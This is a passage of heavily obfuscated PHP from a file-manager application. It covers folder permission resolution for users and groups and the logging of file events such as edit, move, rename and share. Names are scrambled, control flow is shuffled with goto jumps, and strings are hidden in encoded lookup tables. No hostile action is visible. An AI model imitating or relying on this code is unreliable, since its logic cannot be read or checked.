$bµÒ“¤¶Æ = Model($eˆåÀÄÛ¿Ø[479])->getInfo($Dòõ÷­¨ğ); $A®¾ƒšŒŞŒ = Model($eˆåÀÄÛ¿Ø[2297])->listData($bµÒ“¤¶Æ[$eˆåÀÄÛ¿Ø[1326]]); if ($A®¾ƒšŒŞŒ && $A®¾ƒšŒŞŒ[$eˆåÀÄÛ¿Ø[1196]][$eˆåÀÄÛ¿Ø[2298]] == 1) { return !0; } return !1; } private function sourceAuthInfo($CâßÊŒíÔ) { goto E¢µ±Ş©õ; E¢µ±Ş©õ: $dŠ¹¼¼îµğ =& $_SERVER[¦·]; $A‰Õºë½ìÍ = Model($dŠ¹¼¼îµğ[1122]); $C¯ˆ±ìçï® = $A‰Õºë½ìÍ->sourceInfo($CâßÊŒíÔ); goto BÇ¯Œ§; BÇ¯Œ§: if (!$C¯ˆ±ìçï®) { return !1; } $A‰Õºë½ìÍ->groupPathDisplay($C¯ˆ±ìçï®); $BíßÎ®‚ŠÊ = array($C¯ˆ±ìçï®); goto E‡¸‰µÚ¢; E‡¸‰µÚ¢: $BíßÎ®‚ŠÊ = $A‰Õºë½ìÍ->_listAppendPath($BíßÎ®‚ŠÊ); $C¯ˆ±ìçï® = $BíßÎ®‚ŠÊ[0]; $Cô–Š §Ü› = $C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[468]]; goto Aãø‚àä®†; Aãø‚àä®†: if (isset($C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[466]])) { $E£Æ¥î°­„ = explode($dŠ¹¼¼îµğ[8], trim($C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[468]], $dŠ¹¼¼îµğ[8])); array_shift($E£Æ¥î°­„); $Cô–Š §Ü› = $C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[464]] . $dŠ¹¼¼îµğ[2299] . implode($dŠ¹¼¼îµğ[8], $E£Æ¥î°­„); } return array($dŠ¹¼¼îµğ[386] => $C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[28]], $dŠ¹¼¼îµğ[75] => KodIO::make($C¯ˆ±ìçï®[$dŠ¹¼¼îµğ[369]]), $dŠ¹¼¼îµğ[2300] => $Cô–Š §Ü›); goto FØ»•åäƒ; FØ»•åäƒ: } private function groupAuthInfo($f¨Ş‰™ù†Ü, $c–İÅÃÈÄª) { $AŞ–ÎƒÙÁŞ =& $_SERVER[¦·]; $aö–ôÎ”Œ¯ = Model($AŞ–ÎƒÙÁŞ[460])->getInfo($c–İÅÃÈÄª); return array($AŞ–ÎƒÙÁŞ[2301] => intval($f¨Ş‰™ù†Ü[$AŞ–ÎƒÙÁŞ[376]]), $AŞ–ÎƒÙÁŞ[2284] => $f¨Ş‰™ù†Ü, $AŞ–ÎƒÙÁŞ[2302] => LNG($AŞ–ÎƒÙÁŞ[2303]), $AŞ–ÎƒÙÁŞ[2293] => array($AŞ–ÎƒÙÁŞ[386] => $aö–ôÎ”Œ¯[$AŞ–ÎƒÙÁŞ[28]], $AŞ–ÎƒÙÁŞ[75] => KodIO::make($aö–ôÎ”Œ¯[$AŞ–ÎƒÙÁŞ[391]][$AŞ–ÎƒÙÁŞ[369]]), $AŞ–ÎƒÙÁŞ[2300] => $aö–ôÎ”Œ¯[$AŞ–ÎƒÙÁŞ[465]])); } protected function groupRootAuth($fæß‰©¥³¯, $a©ÖÜ°‹·« = false) { goto cÛìõÌ½ÃÑ; aí¿†»Õó: $a³÷„Ü“ÔÒ = $a´Î»²‰Ëë ? $this->authMake($a´Î»²‰Ëë, $a©ÖÜ°‹·«) : !1; $fìİìĞ¼±„[$c†„›¿ÊÂ ] = $a³÷„Ü“ÔÒ ? $a³÷„Ü“ÔÒ[$F«ÊÊãÁœÛ[418]] : $A‡ƒíœ÷¥¯; return $fìİìĞ¼±„[$c†„›¿ÊÂ ]; goto EöÇÇ©•Ü; c¤ÜÂñ‹©Ÿ: $DàÌä‚å÷Ö = array($F«ÊÊãÁœÛ[369] => $Fè¬­‚¸‚½[$F«ÊÊãÁœÛ[391]][$F«ÊÊãÁœÛ[369]]); $B«°ç¢¸‚ = $F«ÊÊãÁœÛ[2283]; $a´Î»²‰Ëë = $this->field($B«°ç¢¸‚)->cacheMemory()->where($DàÌä‚å÷Ö)->select(); goto aí¿†»Õó; e¹¾’“Ş²: $A‡ƒíœ÷¥¯ = isset($cæÄ‚÷Š§ø[$fæß‰©¥³¯]) ? $cæÄ‚÷Š§ø[$fæß‰©¥³¯][$F«ÊÊãÁœÛ[376]] : !1; if ($A‡ƒíœ÷¥¯ && Model($F«ÊÊãÁœÛ[2275])->authCheckAction($A‡ƒíœ÷¥¯[$F«ÊÊãÁœÛ[376]], $F«ÊÊãÁœÛ[1567])) { $fìİìĞ¼±„[$c†„›¿ÊÂ ] = $A‡ƒíœ÷¥¯; return $A‡ƒíœ÷¥¯; } $Fè¬­‚¸‚½ = Model($F«ÊÊãÁœÛ[460])->getInfo($fæß‰©¥³¯); goto c¤ÜÂñ‹©Ÿ; A…êâÊÛ—õ: static $fìİìĞ¼±„ = array(); if (isset($fìİìĞ¼±„[$c†„›¿ÊÂ ])) { return $fìİìĞ¼±„[$c†„›¿ÊÂ ]; } $cæÄ‚÷Š§ø = $this->userGroupList($a©ÖÜ°‹·«); goto e¹¾’“Ş²; cÛìõÌ½ÃÑ: $F«ÊÊãÁœÛ =& $_SERVER[¦·]; $a©ÖÜ°‹·« = $a©ÖÜ°‹·« ? $a©ÖÜ°‹·« : USER_ID; $c†„›¿ÊÂ  = $a©ÖÜ°‹·« . $F«ÊÊãÁœÛ[2304] . $fæß‰©¥³¯; goto A…êâÊÛ—õ; EöÇÇ©•Ü: } public function authOwnerApply($CÇèŞêİ“Š) { goto D¨ëŠŒ„‰¶; BÚ´öĞËí: $AæëÜù«Ì  = array(); $BùÀ×ñÓ±Ò = array(); foreach ($e¶ºÉì±ø× as $dÀ‹©¥ˆ®Ï => $a‡¿ñ’Òì) { $B†•‚öß« = $this->authFolderOwnerUser($a‡¿ñ’Òì); $AæëÜù«Ì [$dÀ‹©¥ˆ®Ï] = $B†•‚öß«; $BùÀ×ñÓ±Ò = array_merge($BùÀ×ñÓ±Ò, $B†•‚öß«[$EõŠ²·ƒ×ê[536]]); if ($B†•‚öß«[$EõŠ²·ƒ×ê[2306]]) { break; } } goto f…‚ò˜÷; Eù‹Ø³ê…ò: $CÇèŞêİ“Š[$EõŠ²·ƒ×ê[376]][$EõŠ²·ƒ×ê[2307]] = Model($EõŠ²·ƒ×ê[476])->userListInfo($BùÀ×ñÓ±Ò); return $CÇèŞêİ“Š; goto cö”›…ÚÉ; d•œÊÏ­‘¼: $Dîä‘ƒ®ÔÏ = array($EõŠ²·ƒ×ê[383] => array($EõŠ²·ƒ×ê[384], $EŒØ¬ )); $e¶ºÉì±ø× = $this->field($AáÂßĞÏÙ¹)->where($Dîä‘ƒ®ÔÏ)->select(); $e¶ºÉì±ø× = array_to_keyvalue_group($e¶ºÉì±ø×, $EõŠ²·ƒ×ê[369]); goto BÚ´öĞËí; aï—æËµ˜: $EŒØ¬  = Model($EõŠ²·ƒ×ê[1122])->parentLevelArray($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[461]]); $EŒØ¬  = array_merge(array($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[369]]), array_reverse($EŒØ¬ )); $AáÂßĞÏÙ¹ = $EõŠ²·ƒ×ê[2283]; goto d•œÊÏ­‘¼; f…‚ò˜÷: if (count($BùÀ×ñÓ±Ò) == 0) { $BùÀ×ñÓ±Ò = $this->authFolderOwnerGroup($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[458]]); } $BùÀ×ñÓ±Ò = array_unique($BùÀ×ñÓ±Ò); if (AuthModel::authCheckRoot($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[376]][$EõŠ²·ƒ×ê[377]])) { $BùÀ×ñÓ±Ò[] = USER_ID; } goto Eù‹Ø³ê…ò; D¨ëŠŒ„‰¶: $EõŠ²·ƒ×ê =& $_SERVER[¦·]; if (empty($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[376]]) || isset($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[2305]]) && $CÇèŞêİ“Š[$EõŠ²·ƒ×ê[2305]]) { return $CÇèŞêİ“Š; } if (AuthModel::authCheckRoot($CÇèŞêİ“Š[$EõŠ²·ƒ×ê[376]][$EõŠ²·ƒ×ê[377]])) { return $CÇèŞêİ“Š; } goto aï—æËµ˜; cö”›…ÚÉ: } private function authFolderOwnerGroup($fÆôŒóò›ï) { $fÛÌ†‡‹Ê =& $_SERVER[¦·]; $fë¤¸øÇ‡ñ = Model($fÛÌ†‡‹Ê[2191])->where(array($fÛÌ†‡‹Ê[2112] => $fÆôŒóò›ï))->select(); $Eõ²ğÆè” = array(); if (!$fë¤¸øÇ‡ñ) { return $Eõ²ğÆè”; } foreach ($fë¤¸øÇ‡ñ as $F‰õŠ¼æ²) { $fÆ–Ç¹½ = $this->authInfo($F‰õŠ¼æ²); if (AuthModel::authCheckRoot($fÆ–Ç¹½[$fÛÌ†‡‹Ê[376]])) { $Eõ²ğÆè”[] = $F‰õŠ¼æ²[$fÛÌ†‡‹Ê[1441]]; } } return $Eõ²ğÆè”; } private function authFolderOwnerUser($B¤Ô÷¬•ó) { $e„Ú²®‘»® =& $_SERVER[¦·]; $féš—ñÒ®Ë = array(); $aøœÇéìæ = !1; foreach ($B¤Ô÷¬•ó as $c¸å«¡•İ) { $d’…¨¥£ÒŒ = $this->authInfo($c¸å«¡•İ); if ($c¸å«¡•İ[$e„Ú²®‘»®[458]] == $e„Ú²®‘»®[470]) { $aøœÇéìæ = !0; } if ($c¸å«¡•İ[$e„Ú²®‘»®[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($d’…¨¥£ÒŒ[$e„Ú²®‘»®[376]])) { $féš—ñÒ®Ë[] = $c¸å«¡•İ[$e„Ú²®‘»®[458]]; } } } return array($e„Ú²®‘»®[536] => $féš—ñÒ®Ë, $e„Ú²®‘»®[2306] => $aøœÇéìæ); } public function authMake($A¶°øØöÀß, $AÏœŸ±—¶â = false) { goto a¶‰÷í™ßš; aÙùÖÀ‘Ï: $f¨Õ«ä÷Ê¿ = 0; $C¿èÔ—…Œ = 0; $dœ•¡ÎİŠ = 0; goto eÒŒ‹ºˆì; aó–ÓÈ ß: $C¨“§¡³Øï = 0; $d¹ª„èßŞÇ = 0; $bÓ…™ÊµÌ = array($DÇ¾òİò’ô[369] => 0); goto e™çÄ¸›ó; eÒŒ‹ºˆì: $bˆ½êŸÊ‰ˆ = 1000; $eˆÌÜ¿â¨Ö = 0; $cÊ›‘Õ«²Õ = 0; goto aó–ÓÈ ß; AÂ¶±Œ“öñ: $b£ÔÀ¥Èãâ = 0; $A¶„ê•ºÕ« = 0; $f‹¶¿Ê¥çÔ = 0; goto aÙùÖÀ‘Ï; a¶‰÷í™ßš: $DÇ¾òİò’ô =& $_SERVER[¦·]; if (!$A¶°øØöÀß) { return array($DÇ¾òİò’ô[377] => 0, $DÇ¾òİò’ô[418] => !1); } $AÏœŸ±—¶â = $AÏœŸ±—¶â ? $AÏœŸ±—¶â : USER_ID; goto AÂ¶±Œ“öñ; e™çÄ¸›ó: foreach ($A¶°øØöÀß as $bÓ…™ÊµÌ) { $AöáÈ†×¨ = $this->authInfo($bÓ…™ÊµÌ); $fë»‘ÌÊŒ» = $bÓ…™ÊµÌ[$DÇ¾òİò’ô[458]]; $døîŒÆéŠŒ = intval($AöáÈ†×¨[$DÇ¾òİò’ô[376]]); if ($bÓ…™ÊµÌ[$DÇ¾òİò’ô[371]] == SourceModel::TYPE_USER && $fë»‘ÌÊŒ» == $AÏœŸ±—¶â) { $b£ÔÀ¥Èãâ = !0; $f‹¶¿Ê¥çÔ = $AöáÈ†×¨; $A¶„ê•ºÕ« = $døîŒÆéŠŒ; } else { if ($bÓ…™ÊµÌ[$DÇ¾òİò’ô[371]] == SourceModel::TYPE_GROUP && $this->groupContainUser($fë»‘ÌÊŒ», $AÏœŸ±—¶â)) { $f¨Õ«ä÷Ê¿ = !0; $a˜¨±ó’á = $this->groupStepToUserGroup($fë»‘ÌÊŒ», $AÏœŸ±—¶â); if ($a˜¨±ó’á < $bˆ½êŸÊ‰ˆ) { $bˆ½êŸÊ‰ˆ = $a˜¨±ó’á; $C¿èÔ—…Œ = $døîŒÆéŠŒ; $dœ•¡ÎİŠ = $AöáÈ†×¨; $eˆÌÜ¿â¨Ö = $fë»‘ÌÊŒ»; } if ($a˜¨±ó’á == $bˆ½êŸÊ‰ˆ && $døîŒÆéŠŒ >= $C¿èÔ—…Œ) { $C¿èÔ—…Œ = $døîŒÆéŠŒ; $dœ•¡ÎİŠ = $AöáÈ†×¨; $eˆÌÜ¿â¨Ö = $fë»‘ÌÊŒ»; } } else { if ($fë»‘ÌÊŒ» == $DÇ¾òİò’ô[470]) { $cÊ›‘Õ«²Õ = !0; $d¹ª„èßŞÇ = $AöáÈ†×¨; $C¨“§¡³Øï = $døîŒÆéŠŒ; } } } } if ($b£ÔÀ¥Èãâ) { $E—‚çÀÓÄá = $A¶„ê•ºÕ«; $AöáÈ†×¨ = $f‹¶¿Ê¥çÔ; $còã‘¹åä = LNG($DÇ¾òİò’ô[2308]); } else { if ($f¨Õ«ä÷Ê¿) { $E—‚çÀÓÄá = $C¿èÔ—…Œ; $AöáÈ†×¨ = $dœ•¡ÎİŠ; $FÃ¶ª³„áğ = Model($DÇ¾òİò’ô[460])->getInfo($eˆÌÜ¿â¨Ö); $còã‘¹åä = $DÇ¾òİò’ô[157] . $FÃ¶ª³„áğ[$DÇ¾òİò’ô[465]] . $DÇ¾òİò’ô[2309] . LNG($DÇ¾òİò’ô[2310]); } else { if ($cÊ›‘Õ«²Õ) { $E—‚çÀÓÄá = $C¨“§¡³Øï; $AöáÈ†×¨ = $d¹ª„èßŞÇ; $còã‘¹åä = LNG($DÇ¾òİò’ô[2280]); } else { $E—‚çÀÓÄá = 0; $AöáÈ†×¨ = !1; $còã‘¹åä = $DÇ¾òİò’ô[33]; } } } $CŒøÉŠ¶÷“ = array($DÇ¾òİò’ô[2301] => intval($E—‚çÀÓÄá), $DÇ¾òİò’ô[2284] => $AöáÈ†×¨, $DÇ¾òİò’ô[2302] => $còã‘¹åä, $DÇ¾òİò’ô[2293] => $this->sourceAuthInfo($bÓ…™ÊµÌ[$DÇ¾òİò’ô[369]])); goto A¤ëĞˆ…ƒ¿; A¤ëĞˆ…ƒ¿: return $CŒøÉŠ¶÷“; goto b˜Œ³ã; b˜Œ³ã: } private function groupContainUser($C’éË´ÍÈÚ, $BøŠªÏ•š¨ = false) { return in_array($C’éË´ÍÈÚ, $this->userGroupParents($BøŠªÏ•š¨)); } private function groupStepToUserGroup($d¦ˆˆëØÚí, $AŠ¿Ë¾Î„ = false) { goto Bøö²»›¡£; Dë±Î†ª½µ: $a­¥‘“²íÈ = $GLOBALS[$eÍˆŒ©»ô—[6]][$eÍˆŒ©»ô—[84]][$eÍˆŒ©»ô—[2203]] == 1; $f†ïâ ŸéÖ = $a­¥‘“²íÈ ? 3 : 2; foreach ($fñŠ†›ğ±ï as $CêãÆƒ°å¸) { if ($CêãÆƒ°å¸[$eÍˆŒ©»ô—[2112]] == $d¦ˆˆëØÚí) { return 0; } $aÊËùÙ¹éç = explode($eÍˆŒ©»ô—[47], trim($CêãÆƒ°å¸[$eÍˆŒ©»ô—[461]], $eÍˆŒ©»ô—[47])); if ($aÊËùÙ¹éç[0] == $eÍˆŒ©»ô—[470] && count($aÊËùÙ¹éç) > $f†ïâ ŸéÖ) { $F£Õã‹½Òó = array_reverse(array_slice($aÊËùÙ¹éç, $f†ïâ ŸéÖ)); $C§¦Ÿî¬ = array_search($d¦ˆˆëØÚí, $F£Õã‹½Òó); if ($C§¦Ÿî¬ !== !1 && $C§¦Ÿî¬ + 1 <= $Eêæ‘Ø«²) { $Eêæ‘Ø«² = $C§¦Ÿî¬ + 1; } } } goto bÆßÀÊ¶òº; bÆßÀÊ¶òº: return $Eêæ‘Ø«²; goto FÓ˜Ã¿›á³; Bøö²»›¡£: $eÍˆŒ©»ô— =& $_SERVER[¦·]; $fñŠ†›ğ±ï = $this->userGroupList($AŠ¿Ë¾Î„); $Eêæ‘Ø«² = 1000; goto Dë±Î†ª½µ; FÓ˜Ã¿›á³: } private function userGroupList($dÍ©ß¨‚¯— = false) { $fî‹¼–¥á‹ =& $_SERVER[¦·]; static $Eë–ÑÏµĞ = array(); if (isset($Eë–ÑÏµĞ[$dÍ©ß¨‚¯—])) { return $Eë–ÑÏµĞ[$dÍ©ß¨‚¯—]; } $fÅÓÌ÷‰‡æ = Model($fî‹¼–¥á‹[479])->getInfo($dÍ©ß¨‚¯—); $Eë–ÑÏµĞ[$dÍ©ß¨‚¯—] = array_to_keyvalue($fÅÓÌ÷‰‡æ[$fî‹¼–¥á‹[2281]], $fî‹¼–¥á‹[2112]); return $Eë–ÑÏµĞ[$dÍ©ß¨‚¯—]; } public function userGroupParents($AŠ¥Éâ‡¤) { goto fº¯Ü¹¤®; fº¯Ü¹¤®: $fŒô¸«ÑÖ =& $_SERVER[¦·]; static $EƒïçéÛÚ = array(); $AŠ¥Éâ‡¤ = $AŠ¥Éâ‡¤ ? $AŠ¥Éâ‡¤ : USER_ID; goto cÃ…¢½«ãØ; DÅ¬¯Æ: $C…¦°ªòØ¥ = $GLOBALS[$fŒô¸«ÑÖ[6]][$fŒô¸«ÑÖ[84]][$fŒô¸«ÑÖ[2203]] == 1; $d§ôÖ½‹¨Š = $C…¦°ªòØ¥ ? 3 : 2; foreach ($fÏŒå»Ï± as $FõÜ×æ¿¡ø) { $dÄƒğÔŞô¬ = array($FõÜ×æ¿¡ø[$fŒô¸«ÑÖ[2112]]); $C‡“ç—ùµÃ = explode($fŒô¸«ÑÖ[47], trim($FõÜ×æ¿¡ø[$fŒô¸«ÑÖ[461]], $fŒô¸«ÑÖ[47])); if ($C‡“ç—ùµÃ[0] == $fŒô¸«ÑÖ[470] && count($C‡“ç—ùµÃ) > $d§ôÖ½‹¨Š) { $cŸñ÷âØ„¹ = array_slice($C‡“ç—ùµÃ, $d§ôÖ½‹¨Š); $dÄƒğÔŞô¬ = array_merge($dÄƒğÔŞô¬, array_reverse($cŸñ÷âØ„¹)); } $bŠå®¥Ò±˜ = array_merge($bŠå®¥Ò±˜, $dÄƒğÔŞô¬); } goto FÓãç‰¥í; cÃ…¢½«ãØ: if (isset($EƒïçéÛÚ[$AŠ¥Éâ‡¤])) { return $EƒïçéÛÚ[$AŠ¥Éâ‡¤]; } $fÏŒå»Ï± = $this->userGroupList($AŠ¥Éâ‡¤); $bŠå®¥Ò±˜ = array(); goto DÅ¬¯Æ; FÓãç‰¥í: $EƒïçéÛÚ[$AŠ¥Éâ‡¤] = array_unique($bŠå®¥Ò±˜); return $EƒïçéÛÚ[$AŠ¥Éâ‡¤]; goto eÄœè¿‘É›; eÄœè¿‘É›: } public function authTargetInfoMake($eÈÒÈãÍ³) { goto B¨åæ§óœÏ; dÔ”ƒ©Èİ: return array($dšäÀÀ¹ÏÙ[2311] => $B×±„ŞŒŒ, $dšäÀÀ¹ÏÙ[2312] => $E÷Îõ‹”¸Š); goto DŒˆœ¯×³; B¨åæ§óœÏ: $dšäÀÀ¹ÏÙ =& $_SERVER[¦·]; $B×±„ŞŒŒ = array(); $E÷Îõ‹”¸Š = array(); goto AÕ…Œé»§; AÕ…Œé»§: foreach ($eÈÒÈãÍ³ as $f—†…’À¶À) { if ($f—†…’À¶À[$dšäÀÀ¹ÏÙ[371]] == SourceModel::TYPE_USER) { $B×±„ŞŒŒ[] = intval($f—†…’À¶À[$dšäÀÀ¹ÏÙ[458]]); } else { if ($f—†…’À¶À[$dšäÀÀ¹ÏÙ[371]] == SourceModel::TYPE_GROUP) { $E÷Îõ‹”¸Š[] = intval($f—†…’À¶À[$dšäÀÀ¹ÏÙ[458]]); } } } if ($B×±„ŞŒŒ) { $B×±„ŞŒŒ = Model($dšäÀÀ¹ÏÙ[476])->userListInfo($B×±„ŞŒŒ); } if ($E÷Îõ‹”¸Š) { $Bß´‹É­ = array($dšäÀÀ¹ÏÙ[2189] => array($dšäÀÀ¹ÏÙ[384], $E÷Îõ‹”¸Š)); $E÷Îõ‹”¸Š = Model($dšäÀÀ¹ÏÙ[460])->field($dšäÀÀ¹ÏÙ[2202])->where($Bß´‹É­)->select(); $E÷Îõ‹”¸Š = array_to_keyvalue($E÷Îõ‹”¸Š, $dšäÀÀ¹ÏÙ[2112]); } goto dÔ”ƒ©Èİ; DŒˆœ¯×³: } public function authInfo($AÚ”ù¬ÄØÕ) { $EÕöˆ§¶í¼ =& $_SERVER[¦·]; if ($AÚ”ù¬ÄØÕ[$EÕöˆ§¶í¼[2256]]) { $A¡á¶ Ñª³ = Model($EÕöˆ§¶í¼[2275])->listData($AÚ”ù¬ÄØÕ[$EÕöˆ§¶í¼[2256]]); if (!$A¡á¶ Ñª³) { return !1; $d¨ÀÌÛÆÏ÷ = Model($EÕöˆ§¶í¼[2275])->listData(); $a‘Ñ™¤¿Õ‘ = array_filter_by_field($d¨ÀÌÛÆÏ÷, $EÕöˆ§¶í¼[376], $EÕöˆ§¶í¼[470]); return $a‘Ñ™¤¿Õ‘; } $EªĞ¢””Â… = array_field_key($A¡á¶ Ñª³, array($EÕöˆ§¶í¼[367], $EÕöˆ§¶í¼[28], $EÕöˆ§¶í¼[376], $EÕöˆ§¶í¼[2131], $EÕöˆ§¶í¼[2134])); $EªĞ¢””Â…[$EÕöˆ§¶í¼[2313]] = $AÚ”ù¬ÄØÕ; return $EªĞ¢””Â…; } else { return array($EÕöˆ§¶í¼[385] => 0, $EÕöˆ§¶í¼[2118] => $AÚ”ù¬ÄØÕ[$EÕöˆ§¶í¼[2257]], $EÕöˆ§¶í¼[386] => $EÕöˆ§¶í¼[33], $EÕöˆ§¶í¼[2131] => $EÕöˆ§¶í¼[2314]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\145\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\124\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\x66\x75\x6e\143\164\151\x6f\156"), array("\x64\x65\163\x63", '', "\151\x6e\x73\x65\x72\164\54\165\160\x64\141\164\x65\x2c\163\x65\154\145\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D·‘—‰»Ğ†, $D›‡¸“¹á, $C·¿‘È¶Áì = '') { goto dµÔ´ëÈÆ‘; dµÔ´ëÈÆ‘: $f–Í×ã“† =& $_SERVER[¦·]; if (!$this->eventSave) { return; } $D‡‡ƒ³âô = Model($f–Í×ã“†[1122])->sourceInfo($D·‘—‰»Ğ†); goto bˆà•»ß¸Ä; FÆË™ä’¸ˆ: $AåÍ•Ç›ĞÕ = array($f–Í×ã“†[383] => $D·‘—‰»Ğ†, $f–Í×ã“†[2315] => $D‡‡ƒ³âô[$f–Í×ã“†[463]], $f–Í×ã“†[2316] => $D‡‡ƒ³âô[$f–Í×ã“†[28]], $f–Í×ã“†[468] => $D‡‡ƒ³âô[$f–Í×ã“†[468]], $f–Í×ã“†[1432] => USER_ID, $f–Í×ã“†[388] => $D›‡¸“¹á, $f–Í×ã“†[1434] => $C·¿‘È¶Áì); $this->addSystemLog($D›‡¸“¹á, $AåÍ•Ç›ĞÕ); return $this->add($AåÍ•Ç›ĞÕ); goto báÔ¤³„™ä; bˆà•»ß¸Ä: if (!$D‡‡ƒ³âô) { return !1; } if ($this->isCacheEvent($D‡‡ƒ³âô, $D›‡¸“¹á)) { return; } if ($C·¿‘È¶Áì && is_string($C·¿‘È¶Áì)) { $C·¿‘È¶Áì = array($f–Í×ã“†[2143] => $C·¿‘È¶Áì); } goto FÆË™ä’¸ˆ; báÔ¤³„™ä: } private function addSystemLog($D‹¤‡œä—•, $aÏ÷öÒàĞ½) { $C°ÀË™è¬¥ =& $_SERVER[¦·]; if ($D‹¤‡œä—• == $C°ÀË™è¬¥[2317]) { $D‹¤‡œä—• = $aÏ÷öÒàĞ½[$C°ÀË™è¬¥[405]][$C°ÀË™è¬¥[2318]]; } else { if (in_array($D‹¤‡œä—•, array($C°ÀË™è¬¥[2089], $C°ÀË™è¬¥[2319]))) { $D‹¤‡œä—• = $aÏ÷öÒàĞ½[$C°ÀË™è¬¥[405]][$C°ÀË™è¬¥[693]]; } } $B¥…ÕÑË¹ = array_merge($aÏ÷öÒàĞ½, array($C°ÀË™è¬¥[2320] => $aÏ÷öÒàĞ½[$C°ÀË™è¬¥[369]], $C°ÀË™è¬¥[2321] => $aÏ÷öÒàĞ½[$C°ÀË™è¬¥[2321]])); Model($C°ÀË™è¬¥[2052])->addLog($C°ÀË™è¬¥[2322] . $D‹¤‡œä—•, $B¥…ÕÑË¹); } private function isCacheEvent($cîÛš£•”œ, $fŠ”‚»İÚ¼) { if ($cîÛš£•”œ[$_SERVER[¦·][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($b“æÓÕºÇ¿, $a‹ã±º»‡Ø) { $fƒÔ×Ó—İ¾ =& $_SERVER[¦·]; $bÀ¢æèÄ = Model($fƒÔ×Ó—İ¾[1122])->sourceInfo($b“æÓÕºÇ¿); $AÂÕ÷‡è¬ = array($fƒÔ×Ó—İ¾[2318] => $a‹ã±º»‡Ø, $fƒÔ×Ó—İ¾[28] => $bÀ¢æèÄ[$fƒÔ×Ó—İ¾[28]]); return $this->addEvent($b“æÓÕºÇ¿, $fƒÔ×Ó—İ¾[2317], $AÂÕ÷‡è¬); } public function eventFileEdit($Dä‘ÖìîùÑ) { $BÂ‘õ¬Æˆ† =& $_SERVER[¦·]; $EÆ°ˆ—‡Æê = array($BÂ‘õ¬Æˆ†[2323] => $_SERVER[$BÂ‘õ¬Æˆ†[2324]], $BÂ‘õ¬Æˆ†[1756] => strtolower(ACTION)); return $this->addEvent($Dä‘ÖìîùÑ, $BÂ‘õ¬Æˆ†[2079], $EÆ°ˆ—‡Æê); } public function eventRecycle($D’Ïƒ‚ß Ö, $Cçó—´Îæ…) { return $this->addEvent($D’Ïƒ‚ß Ö, $_SERVER[¦·][2319], $Cçó—´Îæ…); } public function eventRemove($dÄ…´õ—) { $F™‚•¹´Î =& $_SERVER[¦·]; $d‘£¯´Ó ä = Model($F™‚•¹´Î[1122])->sourceInfo($dÄ…´õ—); $AÆäÛêÅö = $d‘£¯´Ó ä[$F™‚•¹´Î[28]]; return $this->addEvent($d‘£¯´Ó ä[$F™‚•¹´Î[463]], $F™‚•¹´Î[2078], $AÆäÛêÅö); } public function eventShare($eéƒÏÊš¹, $eŒ¢ÁŠ‰‘ù) { return $this->addEvent($eéƒÏÊš¹, $_SERVER[¦·][2089], $eŒ¢ÁŠ‰‘ù); } public function eventMove($eØ¸ùˆ±Û, $Eõ¶“šŸõ¿, $dêô§ùõ—”) { goto fí¬‰èÃò; D­ê‹¿”œ: $Bê®äËè® = $c‰ŠƒÌÙÙì->sourceInfo($Eõ¶“šŸõ¿); $B“™áÃ Íé = $c‰ŠƒÌÙÙì->sourceInfo($dêô§ùõ—”); $FëåÊ™µÅ = array($DÔí·¼Ü¯[1010] => $Eõ¶“šŸõ¿, $DÔí·¼Ü¯[2325] => $Bê®äËè®[$DÔí·¼Ü¯[28]], $DÔí·¼Ü¯[2326] => $Bê®äËè®[$DÔí·¼Ü¯[468]], $DÔí·¼Ü¯[1011] => $dêô§ùõ—”, $DÔí·¼Ü¯[2327] => $B“™áÃ Íé[$DÔí·¼Ü¯[28]], $DÔí·¼Ü¯[2328] => $B“™áÃ Íé[$DÔí·¼Ü¯[468]]); goto AïĞ£çØŒó; fí¬‰èÃò: $DÔí·¼Ü¯ =& $_SERVER[¦·]; $c‰ŠƒÌÙÙì = Model($DÔí·¼Ü¯[1122]); $b†Ñ÷¿µÑÃ = $c‰ŠƒÌÙÙì->sourceInfo($eØ¸ùˆ±Û); goto D­ê‹¿”œ; AïĞ£çØŒó: $this->addEvent($eØ¸ùˆ±Û, $DÔí·¼Ü¯[494], $FëåÊ™µÅ); $b†Ñ÷¿µÑÃ = $c‰ŠƒÌÙÙì->sourceInfo($eØ¸ùˆ±Û); $FëåÊ™µÅ = array($DÔí·¼Ü¯[369] => $b†Ñ÷¿µÑÃ[$DÔí·¼Ü¯[369]], $DÔí·¼Ü¯[28] => $b†Ñ÷¿µÑÃ[$DÔí·¼Ü¯[28]]); goto FÀÓØ¨ Œ÷; FÀÓØ¨ Œ÷: $this->addEvent($Eõ¶“šŸõ¿, $DÔí·¼Ü¯[2329], $FëåÊ™µÅ); goto f’Ç‚Ğøİ; f’Ç‚Ğøİ: } public function eventCopy($fß¼Šô¯°) { $this->eventCreate($fß¼Šô¯°, $_SERVER[¦·][492]); } public function eventRename($Dá‡ŒäÁ‹‚, $AÜòá‚Ïİä, $Aì“îšÔ²Œ) { $e¸²º¡Éë =& $_SERVER[¦·]; $e«´‚ªÓùƒ = array($e¸²º¡Éë[1010] => $AÜòá‚Ïİä, $e¸²º¡Éë[1011] => $Aì“îšÔ²Œ); return $this->addEvent($Dá‡ŒäÁ‹‚, $e¸²º¡Éë[1135], $e«´‚ªÓùƒ); } public function eventAddComment($eñã×–ğ‹õ, $d»Ò•Á»Ã) { return $this->addEvent($eñã×–ğ‹õ, $_SERVER[¦·][2330], $d»Ò•Á»Ã); } public function eventAddDesc($E•ÎÓÁçğ, $e³äÉ£ÅöØ) { return $this->addEvent($E•ÎÓÁçğ, $_SERVER[¦·][2331], 